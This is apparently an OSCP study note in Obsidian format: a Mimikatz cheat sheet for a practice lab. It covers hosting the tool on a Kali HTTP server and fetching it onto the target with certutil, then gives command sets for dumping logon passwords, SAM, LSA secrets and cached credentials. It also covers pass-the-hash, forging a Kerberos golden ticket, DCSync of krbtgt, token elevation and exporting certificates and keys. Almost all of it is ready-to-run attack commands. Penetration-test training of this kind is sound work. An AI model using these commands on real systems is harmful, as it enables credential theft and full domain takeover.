# Transfer 

```
cd ~/Desktop/Tools/Windows/mimikatz && python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/mimikatz64.exe mimikatz.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
## Quick usage

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

```
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" "lsadump::sam" "exit"
```

```
.\mimikatz.exe "privilege::debug" "lsadump::secrets" "lsadump::cache" "exit"
```

crackstation.net

---
### Optional — Mimikatz Token Elevation

**Purpose:** Attempt to impersonate an existing privileged Windows access token, commonly SYSTEM.

**Commands:**

```
.\mimikatz.exe "privilege::debug" "token::list" "exit"
```

```
.\mimikatz.exe "privilege::debug" "token::elevate" "exit"
```

**When to consider it:**

- Current shell is a local Administrator or another less-privileged identity.
- You suspect SYSTEM or another privileged account has an accessible token.
- Your normal privilege-escalation route is unavailable.
- Credential enumeration is restricted by your current security context.

**When not to bother:**

- Already running as SYSTEM.
- No suitable privileged token is available.
- The machine's protections prevent access to the token.

---

```
log
privilege::debug
```

### sekurlsa
```
sekurlsa::logonpasswords
sekurlsa::tickets /export

sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

### kerberos
```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi

kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

### crypto
```
crypto::capi
crypto::cng

crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE

crypto::keys /export
crypto::keys /machine /export
```

### vault & lsadump
```
vault::cred
vault::list

token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert

lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

---

Inside Mimikatz, run:

```
privilege::debug
```

You ideally want:

```
Privilege '20' OK
```

Then:

```
sekurlsa::logonpasswords
```

Look for these fields:

```
Authentication Id
Session
User Name
Domain
NTLM
SHA1
Password
```

Pay particular attention to:

- Accounts other than `eric.wallows`.
    
- Accounts belonging to `SECURA`.
    
- Any administrator or service accounts.
    
- NTLM hashes or plaintext passwords, if available.
    

Don't be surprised if the password field is empty. Modern Windows configurations often prevent plaintext passwords from being recoverable.

If cant type, 

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```